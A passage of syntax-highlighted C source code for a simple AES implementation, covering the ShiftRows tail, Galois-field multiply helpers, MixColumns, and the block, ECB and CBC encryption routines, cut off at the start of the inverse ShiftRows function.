</span></span><span class=line><span class=cl>    <span class=nb>int</span> <span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>,</span> <span class=n>r</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=n>i</span><span class=p>;</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>uint8_t</span> <span class=n>tmp</span> <span class=o>=</span> <span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=p>(</span><span class=n>r</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>r</span> <span class=o>&lt;</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>r</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>s</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=n>r</span> <span class=o>*</span> <span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=n>s</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=p>(</span><span class=n>r</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=n>s</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=p>(</span><span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>]</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=n>tmp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=n>uint8_t</span> <span class=n>aes_xtime</span><span class=p>(</span><span class=n>uint8_t</span> <span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>((</span><span class=n>x</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>^</span> <span class=p>(((</span><span class=n>x</span> <span class=o>&gt;&gt;</span> <span class=mi>7</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=mh>0x1b</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=n>uint8_t</span> <span class=n>aes_xtimes</span><span class=p>(</span><span class=n>uint8_t</span> <span class=n>x</span><span class=p>,</span> <span class=nb>int</span> <span class=n>ts</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=n>ts</span><span class=o>--</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span> <span class=o>=</span> <span class=n>aes_xtime</span><span class=p>(</span><span class=n>x</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>x</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=n>uint8_t</span> <span class=n>aes_mul</span><span class=p>(</span><span class=n>uint8_t</span> <span class=n>x</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>/*</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span> <span class=n>encrypt</span><span class=p>:</span> <span class=n>y</span> <span class=n>has</span> <span class=n>only</span> <span class=mi>2</span> <span class=n>bits</span><span class=p>:</span> <span class=n>can</span> <span class=n>be</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>2</span> <span class=ow>or</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span> <span class=n>decrypt</span><span class=p>:</span> <span class=n>y</span> <span class=n>could</span> <span class=n>be</span> <span class=nb>any</span> <span class=n>value</span> <span class=n>of</span> <span class=mi>9</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>d</span><span class=p>,</span> <span class=ow>or</span> <span class=n>e</span>
</span></span><span class=line><span class=cl>    <span class=o>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>((((</span><span class=n>y</span> <span class=o>&gt;&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=n>aes_xtimes</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span> <span class=o>^</span>
</span></span><span class=line><span class=cl>        <span class=p>(((</span><span class=n>y</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=n>aes_xtimes</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=mi>1</span><span class=p>))</span> <span class=o>^</span>
</span></span><span class=line><span class=cl>        <span class=p>(((</span><span class=n>y</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=n>aes_xtimes</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=mi>2</span><span class=p>))</span> <span class=o>^</span>
</span></span><span class=line><span class=cl>        <span class=p>(((</span><span class=n>y</span> <span class=o>&gt;&gt;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=n>aes_xtimes</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=mi>3</span><span class=p>))</span> <span class=o>^</span>
</span></span><span class=line><span class=cl>        <span class=p>(((</span><span class=n>y</span> <span class=o>&gt;&gt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=n>aes_xtimes</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=mi>4</span><span class=p>))</span> <span class=o>^</span>
</span></span><span class=line><span class=cl>        <span class=p>(((</span><span class=n>y</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=n>aes_xtimes</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=mi>5</span><span class=p>))</span> <span class=o>^</span>
</span></span><span class=line><span class=cl>        <span class=p>(((</span><span class=n>y</span> <span class=o>&gt;&gt;</span> <span class=mi>6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=n>aes_xtimes</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=mi>6</span><span class=p>))</span> <span class=o>^</span>
</span></span><span class=line><span class=cl>        <span class=p>(((</span><span class=n>y</span> <span class=o>&gt;&gt;</span> <span class=mi>7</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=n>aes_xtimes</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=mi>7</span><span class=p>)));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>aes_mix_columns</span><span class=p>(</span><span class=n>AES_CYPHER_T</span> <span class=n>mode</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>state</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>y</span><span class=p>[</span><span class=mi>16</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span>  <span class=mi>1</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span>  <span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span>  <span class=mi>3</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>2</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>s</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nb>int</span> <span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>,</span> <span class=n>r</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>r</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>r</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=n>r</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>s</span><span class=p>[</span><span class=n>r</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=p>(</span><span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>s</span><span class=p>[</span><span class=n>r</span><span class=p>]</span> <span class=o>=</span> <span class=n>s</span><span class=p>[</span><span class=n>r</span><span class=p>]</span> <span class=o>^</span> <span class=n>aes_mul</span><span class=p>(</span><span class=n>state</span><span class=p>[</span><span class=n>i</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>j</span><span class=p>],</span> <span class=n>y</span><span class=p>[</span><span class=n>r</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>j</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>r</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>r</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=n>r</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>state</span><span class=p>[</span><span class=n>i</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>r</span><span class=p>]</span> <span class=o>=</span> <span class=n>s</span><span class=p>[</span><span class=n>r</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=nb>int</span> <span class=n>aes_encrypt</span><span class=p>(</span><span class=n>AES_CYPHER_T</span> <span class=n>mode</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>data</span><span class=p>,</span> <span class=nb>int</span> <span class=nb>len</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>w</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>*</span> <span class=mi>15</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span> <span class=o>/*</span> <span class=nb>round</span> <span class=n>key</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>s</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span> <span class=o>/*</span> <span class=n>state</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>int</span> <span class=n>nr</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=n>key</span> <span class=n>expansion</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>    <span class=n>aes_key_expansion</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>w</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=n>start</span> <span class=n>data</span> <span class=n>cypher</span> <span class=n>loop</span> <span class=n>over</span> <span class=nb>input</span> <span class=n>buffer</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>;</span> <span class=n>i</span> <span class=o>+=</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/*</span> <span class=n>init</span> <span class=n>state</span> <span class=kn>from</span> <span class=nn>user</span> <span class=n>buffer</span> <span class=p>(</span><span class=n>plaintext</span><span class=p>)</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>s</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=n>j</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/*</span> <span class=n>start</span> <span class=n>AES</span> <span class=n>cypher</span> <span class=n>loop</span> <span class=n>over</span> <span class=nb>all</span> <span class=n>AES</span> <span class=n>rounds</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>nr</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>nr</span> <span class=o>&lt;=</span> <span class=n>g_aes_rounds</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>nr</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>nr</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=o>/*</span> <span class=n>do</span> <span class=n>SubBytes</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>                <span class=n>aes_sub_bytes</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=o>/*</span> <span class=n>do</span> <span class=n>ShiftRows</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>                <span class=n>aes_shift_rows</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>nr</span> <span class=o>&lt;</span> <span class=n>g_aes_rounds</span><span class=p>[</span><span class=n>mode</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=o>/*</span> <span class=n>do</span> <span class=n>MixColumns</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>                    <span class=n>aes_mix_columns</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=o>/*</span> <span class=n>do</span> <span class=n>AddRoundKey</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>            <span class=n>aes_add_round_key</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=n>w</span><span class=p>,</span> <span class=n>nr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/*</span> <span class=n>save</span> <span class=n>state</span> <span class=p>(</span><span class=n>cypher</span><span class=p>)</span> <span class=n>to</span> <span class=n>user</span> <span class=n>buffer</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>s</span><span class=p>[</span><span class=n>j</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=nb>int</span> <span class=n>aes_encrypt_ecb</span><span class=p>(</span><span class=n>AES_CYPHER_T</span> <span class=n>mode</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>data</span><span class=p>,</span> <span class=nb>int</span> <span class=nb>len</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>aes_encrypt</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=nb>len</span><span class=p>,</span> <span class=n>key</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=nb>int</span> <span class=n>aes_encrypt_cbc</span><span class=p>(</span><span class=n>AES_CYPHER_T</span> <span class=n>mode</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>data</span><span class=p>,</span> <span class=nb>int</span> <span class=nb>len</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>key</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>w</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>*</span> <span class=mi>15</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span> <span class=o>/*</span> <span class=nb>round</span> <span class=n>key</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>s</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span> <span class=o>/*</span> <span class=n>state</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=n>v</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span> <span class=o>/*</span> <span class=n>iv</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>int</span> <span class=n>nr</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=n>key</span> <span class=n>expansion</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>    <span class=n>aes_key_expansion</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>w</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>memcpy</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=n>iv</span><span class=p>,</span> <span class=n>sizeof</span><span class=p>(</span><span class=n>v</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>/*</span> <span class=n>start</span> <span class=n>data</span> <span class=n>cypher</span> <span class=n>loop</span> <span class=n>over</span> <span class=nb>input</span> <span class=n>buffer</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>;</span> <span class=n>i</span> <span class=o>+=</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/*</span> <span class=n>init</span> <span class=n>state</span> <span class=kn>from</span> <span class=nn>user</span> <span class=n>buffer</span> <span class=p>(</span><span class=n>plaintext</span><span class=p>)</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>s</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=n>j</span><span class=p>]</span> <span class=o>^</span> <span class=n>v</span><span class=p>[</span><span class=n>j</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/*</span> <span class=n>start</span> <span class=n>AES</span> <span class=n>cypher</span> <span class=n>loop</span> <span class=n>over</span> <span class=nb>all</span> <span class=n>AES</span> <span class=n>rounds</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>nr</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>nr</span> <span class=o>&lt;=</span> <span class=n>g_aes_rounds</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>nr</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>nr</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=o>/*</span> <span class=n>do</span> <span class=n>SubBytes</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>                <span class=n>aes_sub_bytes</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=o>/*</span> <span class=n>do</span> <span class=n>ShiftRows</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>                <span class=n>aes_shift_rows</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>nr</span> <span class=o>&lt;</span> <span class=n>g_aes_rounds</span><span class=p>[</span><span class=n>mode</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=o>/*</span> <span class=n>do</span> <span class=n>MixColumns</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>                    <span class=n>aes_mix_columns</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=o>/*</span> <span class=n>do</span> <span class=n>AddRoundKey</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>            <span class=n>aes_add_round_key</span><span class=p>(</span><span class=n>mode</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=n>w</span><span class=p>,</span> <span class=n>nr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/*</span> <span class=n>save</span> <span class=n>state</span> <span class=p>(</span><span class=n>cypher</span><span class=p>)</span> <span class=n>to</span> <span class=n>user</span> <span class=n>buffer</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>g_aes_nb</span><span class=p>[</span><span class=n>mode</span><span class=p>];</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>v</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>s</span><span class=p>[</span><span class=n>j</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/****************************************************************************************************************/</span>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>inv_shift_rows</span><span class=p>(</span><span class=n>AES_CYPHER_T</span> <span class=n>mode</span><span class=p>,</span> <span class=n>uint8_t</span> <span class=o>*</span><span class=n>state</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>uint8_t</span> <span class=o>*</span><span class=n>s</span> <span class=o>=</span> <span class=p>(</span><span class=n>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=n>state</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nb>int</span> <span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>,</span> <span class=n>r</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
